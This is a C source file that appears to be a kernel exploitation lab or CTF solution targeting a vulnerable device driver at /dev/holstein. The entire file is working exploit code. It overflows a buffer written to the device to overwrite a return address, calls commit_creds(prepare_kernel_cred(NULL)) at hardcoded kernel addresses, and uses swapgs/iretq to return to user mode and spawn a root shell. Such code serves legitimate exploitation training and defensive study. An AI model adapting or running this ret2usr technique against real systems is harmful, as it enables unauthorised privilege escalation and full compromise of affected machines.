#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

void *(*prepare_kernel_cred)(void *)	= (void *)0xffffffff8106e240;
int (*commit_creds)(void *)		= (void *)0xffffffff8106e390;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void restore_state(void)
{
	asm volatile("swapgs\n\t"
		     "movq %[shell], 0x00(%%rsp)\n\t"
		     "movq %[cs], 0x08(%%rsp)\n\t"
		     "movq %[rflags], 0x10(%%rsp)\n\t"
		     "movq %[rsp], 0x18(%%rsp)\n\t"
		     "movq %[ss], 0x20(%%rsp)\n\t"
		     "iretq"
		     :
		     : [shell] "r"(shell), [cs] "r"(cs), [rflags] "r"(rflags),
		       [rsp] "r"(rsp), [ss] "r"(ss));
}

static void get_root(void)
{
	commit_creds(prepare_kernel_cred(NULL));
	restore_state();
}

int main(void)
{
	uint8_t data[0x410] = { 0 };
	int fd;

	save_state();

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	*(uintptr_t *)&data[0x408] = (uintptr_t)get_root;
	write(fd, data, 0x410);

	close(fd);
	return EXIT_SUCCESS;
}
